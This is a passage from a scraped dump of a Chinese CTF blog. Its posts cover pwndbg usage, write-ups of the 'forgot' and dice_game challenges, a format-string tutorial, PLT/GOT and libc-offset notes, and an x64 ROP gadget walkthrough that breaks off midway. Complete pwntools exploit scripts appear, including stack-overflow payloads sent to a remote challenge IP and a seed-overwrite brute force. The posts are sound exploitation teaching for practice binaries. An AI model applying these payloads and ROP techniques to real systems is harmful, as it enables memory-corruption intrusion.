7ffff7a2d830 __libc_start_main+240Program received signal SIGINTpwndbg&gt; bBreakpoint 1 at 0x7ffff7b04260: file ../sysdeps/unix/syscall-template.S, line 84. b *addr 下断点在addr处 12pwndbg&gt; b *0x7ffff7b042a9Breakpoint 4 at 0x7ffff7b042a9: file ../sysdeps/unix/syscall-template.S, line 86. b *reg 根据寄存器的值下断点 12pwndbg&gt; b *$r12Breakpoint 5 at 0x5555555548f0 下完断点后 c（continue）命令，程序会在你下的断点处断下来，但是前提是你要保证程序会执行到那里 rwatch内存访问断点 rwatch *addr 12pwndbg&gt; rwatch *0x7ffff7dd18e0Hardware read watchpoint 6: *0x7ffff7dd18e0 dump 内存dump memory filename start_addr stop_addr 123456789pwndbg&gt; lsdice_game dice_game.i64 dicegame.zip exp.py libc.so.6 t t.cpwndbg&gt; dump memory dump.dmp 0x7fffffffd4c8 0x7fffffffd4d0pwndbg&gt; lsdice_game dice_game.i64 dicegame.zip dump.dmp exp.py libc.so.6 t t.c//dump.dmp就是我们dump下来的内存 ROP神奇的一个gadget__do_global_dtors_aux函数里的 adc [rbp+48h], edxedx和rbp都可控","categories":[],"tags":[]},{"title":"Backdoorctf-2015-forgot","slug":"Backdoorctf-2015-forgot","date":"2019-09-02T17:04:51.000Z","updated":"2019-09-03T08:05:16.000Z","comments":true,"path":"2019/09/02/Backdoorctf-2015-forgot/","link":"","permalink":"http://yoursite.com/2019/09/02/Backdoorctf-2015-forgot/","excerpt":"","text":"一道普通的栈溢出题目 我们首先来检查一下获得的文件 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 只开启了NX保护，没有什么太特殊的保护措施，我们在用IDA Pro看一下反汇编代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990int __cdecl main()&#123; size_t v0; // ebx char v2[32]; // [esp+10h] [ebp-74h] int (*v3)(); // [esp+30h] [ebp-54h] int (*v4)(); // [esp+34h] [ebp-50h] int (*v5)(); // [esp+38h] [ebp-4Ch] int (*v6)(); // [esp+3Ch] [ebp-48h] int (*v7)(); // [esp+40h] [ebp-44h] int (*v8)(); // [esp+44h] [ebp-40h] int (*v9)(); // [esp+48h] [ebp-3Ch] int (*v10)(); // [esp+4Ch] [ebp-38h] int (*v11)(); // [esp+50h] [ebp-34h] int (*v12)(); // [esp+54h] [ebp-30h] char s; // [esp+58h] [ebp-2Ch] int v14; // [esp+78h] [ebp-Ch] size_t i; // [esp+7Ch] [ebp-8h] v14 = 1; v3 = sub_8048604; v4 = sub_8048618; v5 = sub_804862C; v6 = sub_8048640; v7 = sub_8048654; v8 = sub_8048668; v9 = sub_804867C; v10 = sub_8048690; v11 = sub_80486A4; v12 = sub_80486B8; puts(\"What is your name?\"); printf(\"&gt; \"); fflush(stdout); fgets(&amp;s, 32, stdin); sub_80485DD(&amp;s); fflush(stdout); printf(\"I should give you a pointer perhaps. Here: %x\\n\\n\", sub_8048654); fflush(stdout); puts(\"Enter the string to be validate\"); printf(\"&gt; \"); fflush(stdout); __isoc99_scanf(\"%s\", v2); for ( i = 0; ; ++i ) &#123; v0 = i; if ( v0 &gt;= strlen(v2) ) break; switch ( v14 ) &#123; case 1: if ( sub_8048702(v2[i]) ) v14 = 2; break; case 2: if ( v2[i] == 64 ) v14 = 3; break; case 3: if ( sub_804874C(v2[i]) ) v14 = 4; break; case 4: if ( v2[i] == 46 ) v14 = 5; break; case 5: if ( sub_8048784(v2[i]) ) v14 = 6; break; case 6: if ( sub_8048784(v2[i]) ) v14 = 7; break; case 7: if ( sub_8048784(v2[i]) ) v14 = 8; break; case 8: if ( sub_8048784(v2[i]) ) v14 = 9; break; case 9: v14 = 10; break; default: continue; &#125; &#125; (*(&amp;v3 + --v14))(); return fflush(stdout);&#125; 毫无头绪，我们先尝试搜索一下flag，sysytem，cat等常用字符串，看看能不能寻找到什么有用的线索，我们发现了sub_80486CC函数 123456789101112131415161718192021222324252627.text:080486CC ; =============== S U B R O U T I N E =======================================.text:080486CC.text:080486CC ; Attributes: bp-based frame.text:080486CC.text:080486CC sub_80486CC proc near.text:080486CC.text:080486CC s = byte ptr -3Ah.text:080486CC.text:080486CC ; __unwind &#123;.text:080486CC push ebp.text:080486CD mov ebp, esp.text:080486CF sub esp, 58h.text:080486D2 mov dword ptr [esp+0Ch], offset aFlag ; \"./flag\".text:080486DA mov dword ptr [esp+8], offset aCatS ; \"cat %s\".text:080486E2 mov dword ptr [esp+4], 32h ; maxlen.text:080486EA lea eax, [ebp+s].text:080486ED mov [esp], eax ; s.text:080486F0 call _snprintf.text:080486F5 lea eax, [ebp+s].text:080486F8 mov [esp], eax ; command.text:080486FB call _system.text:08048700 leave.text:08048701 retn.text:08048701 ; &#125; // starts at 80486CC.text:08048701 sub_80486CC endp.text:08048701.text:08048702 我们不难看出这个函数调用了system函数，且执行了cat flag的命令，为了方便阅读反汇编一下 1234567int sub_80486CC()&#123; char s; // [esp+1Eh] [ebp-3Ah] snprintf(&amp;s, 0x32u, \"cat %s\", \"./flag\"); return system(&amp;s);&#125; 我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到flag了，现在来分析程序 我们可以发现两个溢出点fgets(&amp;s, 32, stdin);和__isoc99_scanf(&quot;%s&quot;, v2);，我们不难分析出第一个溢出点对于控制程序path没有任何的帮助，我们继续分析第二个溢出点下的for循环，我们发现了一个函数指针(*(&amp;v3 + --v14))();，所谓函数指针其实就是可以直接执行指针所指向的函数，我们可以得知这是关键，前面的switch函数都是障眼法 我们可以得知控制的关键是v3和v14两个值，这时候我们再看这个for循环其实就是在控制v14的值，每执行一次v14的值就减小1，然而程序v14的初始值即为1，因为是--v14，故这时候其实v14的值即为0，函数指针指向的即是v3保存的地址，我们只需要修改v3的值为函数sub_80486CC的地址0x080486cc即可 观察栈地址分布 1234567891011121314char v2[32]; // [esp+10h] [ebp-74h]int (*v3)(); // [esp+30h] [ebp-54h]int (*v4)(); // [esp+34h] [ebp-50h]int (*v5)(); // [esp+38h] [ebp-4Ch]int (*v6)(); // [esp+3Ch] [ebp-48h]int (*v7)(); // [esp+40h] [ebp-44h]int (*v8)(); // [esp+44h] [ebp-40h]int (*v9)(); // [esp+48h] [ebp-3Ch]int (*v10)(); // [esp+4Ch] [ebp-38h]int (*v11)(); // [esp+50h] [ebp-34h]int (*v12)(); // [esp+54h] [ebp-30h]char s; // [esp+58h] [ebp-2Ch]int v14; // [esp+78h] [ebp-Ch]size_t i; // [esp+7Ch] [ebp-8h] 我们可以控制v3到v14的所有变量，因为字符串v2处在ebp-74h的位置和v3相差74h-54h=20h的距离，故我们的payload即可写成payload=&#39;A&#39;*0x20+p32(0x080486cc) 最终的Exploit为 123456789#! /usr/bin/env pythonfrom pwn import *p=remote('111.198.29.45',56015)print p.recvuntil(\"&gt; \")p.sendline('A')payload='A'*32+p32(0x080486cc)print p.recvuntil(\"&gt; \")p.sendline(payload)print p.recvall()","categories":[],"tags":[]},{"title":"从DICE_GAME看RAND函数以及SEED的利用","slug":"┤╙DICE-GAME┐┤RAND║»╩²╥╘╝░SEED╡─└√╙├","date":"2019-09-01T16:41:29.000Z","updated":"2019-09-02T07:41:58.000Z","comments":true,"path":"2019/09/01/┤╙DICE-GAME┐┤RAND║»╩²╥╘╝░SEED╡─└√╙├/","link":"","permalink":"http://yoursite.com/2019/09/01/┤╙DICE-GAME┐┤RAND║»╩²╥╘╝░SEED╡─└√╙├/","excerpt":"","text":"本题来自XCTF 4th-QCTF-2018的dice_game 伪随机数&amp;rand()伪随机数是用确定性的算法计算出来自[0,1]均匀分布的随机数序列。并不真正的随机，但具有类似于随机数的统计特征，如均匀性、独立性等。在计算伪随机数时，若使用的初值（种子）不变，那么伪随机数的数序也不变 rand函数不是真正的随机数生成器，而srand()会设置供rand()使用的随机数种子。如果你在第一次调用rand()之前没有调用srand()，那么系统会为你自动调用srand()。而使用同种子相同的数调用rand()会导致相同的随机数序列被生成 我们可以知道一个简单的结论：计算机里面的随机数生成函数，使用相同的seed（种子）会得到相同的伪随机数序列 dice_game我们先检查一下开启了哪些保护措施 12345Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 直接打开IDA Pro检查一下反汇编代码 12345678910111213141516171819202122232425262728293031323334353637__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char buf[55]; // [rsp+0h] [rbp-50h] char v5; // [rsp+37h] [rbp-19h] ssize_t v6; // [rsp+38h] [rbp-18h] unsigned int seed[2]; // [rsp+40h] [rbp-10h] unsigned int v8; // [rsp+4Ch] [rbp-4h] memset(buf, 0, 0x30uLL); *(_QWORD *)seed = time(0LL); printf(\"Welcome, let me know your name: \", a2); fflush(stdout); v6 = read(0, buf, 0x50uLL); if ( v6 &lt;= 49 ) buf[v6 - 1] = 0; printf(\"Hi, %s. Let's play a game.\\n\", buf); fflush(stdout); srand(seed[0]); v8 = 1; v5 = 0; while ( 1 ) &#123; printf(\"Game %d/50\\n\", v8); v5 = sub_A20(); fflush(stdout); if ( v5 != 1 ) break; if ( v8 == 50 ) &#123; sub_B28(buf); break; &#125; ++v8; &#125; puts(\"Bye bye!\"); return 0LL;&#125; 从memset(buf, 0, 0x30uLL);可以看到程序只开了0x30个，而 read(0, buf, 0x50uLL);却可以读取0x50个，read越界，而buf距离栈底正好0x50，所以传统思路最多只能劫持EBP，而且开启了PIE对后面的利用也是没有帮助。我们发现了srand函数，可以猜测这题和随机数有关系，可以知道种子即是seed[0]，我们寻找一下生成随机数有关的函数，我们发现了sub_A20() 1234567891011121314151617181920212223242526272829303132signed __int64 sub_A20()&#123; signed __int64 result; // rax __int16 v1; // [rsp+Ch] [rbp-4h] __int16 v2; // [rsp+Eh] [rbp-2h] printf(\"Give me the point(1~6): \"); fflush(stdout); _isoc99_scanf(\"%hd\", &amp;v1); if ( v1 &gt; 0 &amp;&amp; v1 &lt;= 6 ) &#123; v2 = rand() % 6 + 1; if ( v1 &lt;= 0 || v1 &gt; 6 || v2 &lt;= 0 || v2 &gt; 6 ) _assert_fail(\"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)\", \"dice_game.c\", 0x18u, \"dice_game\"); if ( v1 == v2 ) &#123; puts(\"You win.\"); result = 1LL; &#125; else &#123; puts(\"You lost.\"); result = 0LL; &#125; &#125; else &#123; puts(\"Invalid value!\"); result = 0LL; &#125; return result;&#125; 可以发现当v1=v2时我们就赢了，而通过v2 = rand() % 6 + 1;可以发现v2就是通过随机数生成的，而v1就是我们输入的数据，函数sub_A20()功能就是rand一个6以内的随机数，然后用户输入一个，连续才对50次就会拿到flag，而我们知道只要确定了种子数就可以得到相同的随机序列。我们可以覆盖seed[0]，而seed[0]正好是rand的种子 Exploit通过 12char buf[55]; // [rsp+0h] [rbp-50h]unsigned int seed[2]; // [rsp+40h] [rbp-10h] 我们可以知道buf在栈上0-50h的位置上，而seed在栈上10h的位置上，我们知道栈是从高地址向低地址生长故栈上的分布应该是 0h(rbp) buf -10h seed-buf -20h buf -30h buf -40h buf -50h buf 我们来看seed和buf的交界处 -7h buf -8h buf -9h seed[1] -10h seed[0] -11h buf 可知，当我们填充0x40个字符时，再填充的一个字符就是seed[0]，故我们可以确定seed[0]的值，我们就确定为0，exploit应该为&#39;a&#39;*0x40 + p64(0) 现在我们知道了随机数的种子数为0，就可以构造相同的随机数列就行爆破，我们还知道v2 = rand() % 6 + 1 完整的exploit如下： 1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom pwn import *from ctypes import *context.log_level = 'debug'libc = cdll.LoadLibrary(\"libc.so.6\")res = []#随机数序列def dice_game():#生成随机数序列 for i in range(50): rand = libc.rand() res.append(rand % 6 + 1) print resp = process('./dice_game')dice_game()payload = 'a'*0x40 + p64(0)p.sendlineafter(\"your name: \", payload)for point in res: p.sendlineafter(\"point(1~6): \", str(point))p.recvline()p.recvline()flag = p.recvline()print flag","categories":[],"tags":[]},{"title":"新手向——浅谈格式化字符串及其内存图例（一）","slug":"╨┬╩╓╧≥í¬í¬╟│╠╕╕±╩╜╗»╫╓╖√┤«╝░╞Σ─┌┤µ═╝└²ú¿╥╗ú⌐","date":"2019-08-13T14:03:14.000Z","updated":"2019-08-14T05:03:32.000Z","comments":true,"path":"2019/08/13/╨┬╩╓╧≥í¬í¬╟│╠╕╕±╩╜╗»╫╓╖√┤«╝░╞Σ─┌┤µ═╝└²ú¿╥╗ú⌐/","link":"","permalink":"http://yoursite.com/2019/08/13/╨┬╩╓╧≥í¬í¬╟│╠╕╕±╩╜╗»╫╓╖√┤«╝░╞Σ─┌┤µ═╝└²ú¿╥╗ú⌐/","excerpt":"","text":"“一切安全问题的起源都是冯·诺依曼结构。”——NULL 本新手向文章第一部分以32位系统为例 前言格式化字符串漏洞在通用漏洞类型库CWE中的编号是134，其解释为“软件使用了格式化字符串作为参数，且该格式化字符串来自外部输入”。会触发该漏洞的函数很有限，主要就是printf、sprintf、fprintf等print家族函数。常见的有格式化字符串函数有： 输入 scanf 输出 函数 基本介绍 printf 输出到 stdout fprintf 输出到指定 FILE 流 vprintf 根据参数列表格式化输出到 stdout vfprintf 根据参数列表格式化输出到指定 FILE 流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数列表格式化输出到字符串 vsnprintf 根据参数列表格式化输出指定字节到字符串 setproctitle 设置 argv syslog 输出日志 err, verr, warn, vwarn 等 。。。 原理首先我们来看看一个普通的printf函数格式化字符串在栈中的存储结构 高地址 …… argv[3] argv[2] argv[1] Format String ESP（EIP） 低地址 不难看出对于printf函数，格式化字符串本身就是第一个参数 例如这样的程序 1printf(\"%d %s %s\",12,\"abc\",\"Hellow\"); 那么对应的内存地址应该是这样的 123456789───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffffce3c —▸ 0x8048432 (main+39) ◂— add esp, 0x1001:0004│ 0xffffce40 —▸ 0x80484db ◂— and eax, 0x73252064 /* '%d %s %s' */02:0008│ 0xffffce44 ◂— 0xc /* '\\x0c' */03:000c│ 0xffffce48 —▸ 0x80484d7 ◂— popal /* 'abc' */04:0010│ 0xffffce4c —▸ 0x80484d0 ◂— dec eax /* 'Hellow' */05:0014│ 0xffffce50 —▸ 0xf7fb43dc (__exit_funcs) —▸ 0xf7fb51e0 (initial) ◂— 0x006:0018│ 0xffffce54 —▸ 0xffffce70 ◂— 0x107:001c│ ebp 0xffffce58 ◂— 0x0 高地址 …… argv[2] ‘Hellow’ argv[2] ‘abc’ argv[1] ‘\\x0c’ Format String ‘%d %s %s’ ESP（EIP） 低地址 正如我之前所写的代码，我们一般会规定printf参数的个数加以限制，完整的程序会类似这样 12345678#include &lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int n=5; printf(\"%d\",n); return 0;&#125; 但也有人会懒省事，写成这样： 12345678#include &lt;bits/stdc++.h&gt;using namespace std;int main()&#123; char a[]=\"neuqcsa\"; printf(a); return 0;&#125; 实参与函数形参的结合顺序是从左往右依次进行的，所以上面的代码也能输出neuqcsa，而此时的内存结构为 123456789───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffffce2c —▸ 0x80484a1 (main+54) ◂— add esp, 0x1001:0004│ 0xffffce30 —▸ 0xffffce44 ◂— 'neuqcsa'02:0008│ 0xffffce34 ◂— 0x003:000c│ 0xffffce38 —▸ 0xf7e30a50 (__new_exitfn+16) ◂— add ebx, 0x1835b004:0010│ 0xffffce3c —▸ 0x804851b (__libc_csu_init+75) ◂— add edi, 105:0014│ 0xffffce40 ◂— 0x106:0018│ eax 0xffffce44 ◂— 'neuqcsa'07:001c│ 0xffffce48 ◂— 0x617363 /* 'csa' */ 高地址 …… argv[2] argv[2] argv[1] Format String ‘neuqcsa’ ESP（EIP） 低地址 上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码： 123456789#include &lt;bits/stdc++.h&gt;using namespace std;int main()&#123; char a[100]; scanf(\"%s\",a); printf(a); return 0;&#125; 如果用户输入的字符串是”%x%x%x”，则会输出以下结果：ffffcde8c2 我们来看一下这个时候的栈结构 123456789───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffffcdcc —▸ 0x80484f7 (main+60) ◂— add esp, 0x1001:0004│ 0xffffcdd0 —▸ 0xffffcde8 ◂— '%x%x%x'... ↓03:000c│ 0xffffcdd8 ◂— 0xc204:0010│ 0xffffcddc —▸ 0xf7e926bb (handle_intel+107) ◂— add esp, 0x1005:0014│ 0xffffcde0 —▸ 0xffffce0e —▸ 0xffff0000 ◂— 0x006:0018│ 0xffffcde4 —▸ 0xffffcf0c —▸ 0xffffd13d ◂— 0x505f434c ('LC_P')07:001c│ eax 0xffffcde8 ◂— '%x%x%x' 高地址 …… argv[2] argv[2] argv[1] Format String ‘%x%x%x’ ESP（EIP） 低地址 为什么会是ffffcde8c2c2这个奇怪的数字呢，其实这是内存中的数据。因为%x表示输出第 n+1 个参数16进制数据，三个%x则表示输出栈中除了ESP外前三个内存的数据，不难看出，此时栈中的第2个参数数据就是Format String本身，之后0xffffcdd4-0xffffcdd8的地址数据均为0xc2，则可之三个%x的对应关系 对于栈来说，第一个参数是返回地址，格式化字符串的第一个参数是栈的第二个参数 也就是对于格式化字符串来说，第一个参数就是格式化字符串本身 %x（1） 0xffffcdd0 0xffffcde8 %x（2） 0xffffcdd4 0xc2 %x（3） 0xffffcdd8 0xc2 故合在一起输出即为ffffcde8c2c2 也许代码编写者的本意只是单纯打印一段字符（如“hello world”），但如果这段字符串来源于外部用户可控的输入，则该用户完全可以在字符串中嵌入格式化字符（如%s）。那么，由于printf允许参数个数不固定，故printf会自动将这段字符当作format参数，而用其后内存中的数据匹配format参数 原罪也就是冯诺依曼机结构中的：程序存储，共享数据，顺序执行 即printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。 所以尽管没有参数，上面的代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。 进阶基本的格式化字符串参数%c：输出字符，配上%n可用于向指定地址写数据。 %d：输出十进制整数，配上%n可用于向指定地址写数据。 %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。 %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。 %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。 %n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据 格式化字符串漏洞的利用手段 使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大 查看进程内容，根据 %d，%f 输出了栈上的内容 泄露栈内存 获取某个变量的值 获取某个变量对应地址的内存 泄露任意地址内存 利用 GOT 表得到 libc 函数地址，进而获取libc，进而获取其它libc 函数地址 盲打，dump 整个程序，获取有用信息","categories":[],"tags":[]},{"title":"新手向——浅谈PLT和GOT","slug":"╨┬╩╓╧≥í¬í¬╟│╠╕PLT║═GOT","date":"2019-08-09T16:23:22.000Z","updated":"2019-08-10T07:23:36.000Z","comments":true,"path":"2019/08/09/╨┬╩╓╧≥í¬í¬╟│╠╕PLT║═GOT/","link":"","permalink":"http://yoursite.com/2019/08/09/╨┬╩╓╧≥í¬í¬╟│╠╕PLT║═GOT/","excerpt":"","text":"在做ROP题目的时候，经常需要我们利用libc.so 动态链接库中的函数。我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。这其中我们经常碰到PLT表和GOT表这两个东西，许多资料写的很复杂，这里以一种不怎么严谨的语言，浅谈一下PLT和GOT 首先我们一个非常简单的例子作为引子 1234567#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; printf(\"Hello World!\"); return 0;&#125; 一个非常简单的C语言程序，我们直接通过gdb进行反编译处理，然后通过disas main查看main函数中的反编译代码 12345678910gdb-peda$ disas mainDump of assembler code for function main: 0x000000000000064a &lt;+0&gt;: push rbp 0x000000000000064b &lt;+1&gt;: mov rbp,rsp 0x000000000000064e &lt;+4&gt;: lea rdi,[rip+0x9f] # 0x6f4 0x0000000000000655 &lt;+11&gt;: mov eax,0x0 0x000000000000065a &lt;+16&gt;: call 0x520 &lt;printf@plt&gt; 0x000000000000065f &lt;+21&gt;: mov eax,0x0 0x0000000000000664 &lt;+26&gt;: pop rbp 0x0000000000000665 &lt;+27&gt;: ret 0x000000000000065a &lt;+16&gt;: call 0x520 &lt;printf@plt&gt; 不难看到出现了这样一行反汇编代码，这就是我们调用的printf函数，为什么后面加了个@plt呢？我们要先知道这个printf函数并不是我们在这个main函数里面的工程里面实现的，而是调用了stdio.h这个standard input &amp; output（标准输入输出)）库实现的，等于说对于main函数这是一个外部函数，所以后面是跟了一个@plt。那什么是PLT？我们先说说什么是GOT GOT是一个存储外部库函数的表，可以用GOT表来间接引用全局变量、函数，也可以把GOT表的首地址作为一个基准，用相对于该基准的偏移量来引用静态变量、静态函数。意思是说，GOT是一个映射表，这里的内容是此段代码里面引用到的外部符号的地址映射，比如你用到了一个printf函数，就会和GOT表产生关系。那这又和PLT有什么关系呢 PLT表可以称为内部函数表，GOT表为全局函数表，这两个表是相对应的，为什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，是一一对应的。所以PLT表中存储的数字到底是什么意思？ 其实就是以GOT表的首地址作为一个基准称为基值，PLT中的值即为所指向函数在内存中相对于基值的偏移量（offset） 也就是说printf@plt的在内存中的真实地址是： GOT基值+PLT存储的偏移量 我们在编写ROP链时，由于 libc的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。所以我们一般会先调用write函数再去暴露write函数在GOT表中的地址，这样暴露的地址才是write函数在内存中的真实地址 如果我们使用pwntools一般是这样使用GOT和PLT地址的 got[&#39;a_function&#39;]找到 a_function的 GOT plt[&#39;a_function&#39;]找到 a_function的 PLT 当我们获得write函数在内存中的真实地址时，如何得到GOT表的基值，进而得到我们想要的system函数之类的地址？我们要知道两个函数在GOT表中的相对地址是不变的，也就是两个函数的PTL地址的偏移量也是不会变的，我们只需要得到其中一个函数的真实地址，减掉两个函数偏移量就可以得到另外一个函数的真实地址 例如我们先得到write函数与基值的偏移量 off_set = libc.symbols[&#39;write&#39;] - libc.symbols[&#39;__libc_start_main&#39;] 然后当我们拿到write函数在GOT表中的真实地址时,就可以计算出基值的真实地址 libc_address = write_address - off_set 还有一种写法libc.address = write_address - off_set，这样就可以在找system函数的真实地址时就直接可以：system_address = libc.symbols[&quot;system&quot;] 所谓GOT表和PTL表都是为了重定位而生的 链接阶段是将一个或多个中间文件(.o文件)通过链接器将它们链接成一个可执行文件，主要做的事情有 对各个中间文件的同名section进行合并 对代码段，数据段等进行地址分配 进行链接时重定位 两种情况： 如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址 如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段 运行时重定位运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位 延迟重定位只有动态库函数在被调用时，才会进行地址解析和重定位工作，这时候动态库函数的地址才会被写入到GOT表项中 函数第一次被调用过程 第一步由函数调用跳入到PLT表中，然后第二步PLT表跳到GOT表中，可以看到第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第5步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到GOT表项中，然后执行函数并返回。 解释下dynamic段，link_map和_dl_runtime_resolve dynamic段：提供动态链接的信息，例如动态链接中各个表的位置 link_map：已加载库的链表，由动态库函数的地址构成的链表 _dl_runtime_resolve：在第一次运行时进行地址解析和重定位工作 函数之后被调用过程 可以看到，第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。 对于动态函数的调用，第一次要经过地址解析和回写到GOT表项中，第二次直接调用即可","categories":[],"tags":[]},{"title":"XMAN-2019-福州-PWN-stackoverflow（下）","slug":"XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐","date":"2019-08-09T16:22:40.000Z","updated":"2019-08-10T07:23:02.000Z","comments":true,"path":"2019/08/09/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐/","link":"","permalink":"http://yoursite.com/2019/08/09/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐/","excerpt":"","text":"今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverflow3这题没有源代码，我们直接看IDA Pro反汇编得出的代码 12345678910111213141516171819202122232425int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-400h] alarm(0xAu); write(1, \"Welcome \\n\", 0x10uLL); fflush(_bss_start); read(0, &amp;buf, 0x400uLL); echo(&amp;buf, &amp;buf); return 0;&#125;int __fastcall echo(__int64 a1)&#123; char s2[16]; // [rsp+10h] [rbp-10h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) s2[i] = *(_BYTE *)(i + a1); s2[i] = 0; if ( !strcmp(\"HEHE\", s2) ) &#123; printf(\"flag&#123;Welcome&#125;\", s2); puts(\" is not flag\"); &#125; return printf(\"%s\", s2);&#125; 检查一下开启的安全保护 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 可以发现这是一个64位程序，64位程序和我们之前一直做的32位程序在传参数方式上有很大的不同。 linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007FFFFFFFFFFF，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。 也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。 123456789101112131415161718syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverlow3$ ROPgadget --binary simple_stackoverlow3 --only \"pop|ret\" Gadgets information============================================================0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004008a0 : pop r14 ; pop r15 ; ret0x00000000004008a2 : pop r15 ; ret0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400675 : pop rbp ; ret0x00000000004008a3 : pop rdi ; ret0x00000000004008a1 : pop rsi ; pop r15 ; ret0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400589 : ret0x00000000004006a5 : ret 0xc1480x000000000040081a : ret 0xfffdUnique gadgets found: 13 我们可以发现程序现有的gadget并不能很好的构建ROP链条。其实在x64下有一些万能的gadgets可以利用。一般来说，只要程序调用了libc.so，程序都会有__libc_csu_init()这个函数用来对libc进行初始化操作。 123456789101112131415161718.text:0000000000400880 loc_400880: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400880 mov rdx, r13.text:0000000000400883 mov rsi, r14.text:0000000000400886 mov edi, r15d.text:0000000000400889 call qword ptr [r12+rbx*8].text:000000000040088D add rbx, 1.text:0000000000400891 cmp rbx, rbp.text:0000000000400894 jnz short loc_400880.text:0000000000400896.text:0000000000400896 loc_400896: ; CODE XREF: __libc_csu_init+36↑j.text:0000000000400896 add rsp, 8.text:000000000040089A pop rbx.text:000000000040089B pop rbp.text:000000000040089C pop r12.text:000000000040089E pop r13.text:00000000004008A0 pop r14.text:00000000004008A2 pop r15.text:00000000004008A4 retn 观察0x000000000040089A 1234567.text:000000000040089A pop rbx.text:000000000040089B pop rbp.text:000000000040089C pop r12.text:000000000040089E pop r13.text:00000000004008A0 pop r14.text:00000000004008A2 pop r15.text:00000000004008A4 retn 我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。 因为栈是从高地址到低地址生长，而计算机读取指令是从低地址到高地址如果我们的参数为 argv[1], argv[2], argv[3], argv[4], argv[5], argv[6] 则他们在栈中的内存分布应该为 High Adress argv[6] argv[5] argv[4] argv[3] argv[2] argv[1] Low Adress 则执行指令 1234567pop rbxpop rbppop r12pop r13pop r14pop r15retn 完成时的对应关系应该为 argv[6] R15 argv[5] R14 argv[4] R13 argv[3] R12 argv[2] RBP argv[1] RBX 从0x0000000000400880到 0x0000000000400886 123mov rdx, r13mov rsi, r14mov edi, r15d 我们可以将R13 赋给RDX, 将R14赋给RSI，将R15D赋给 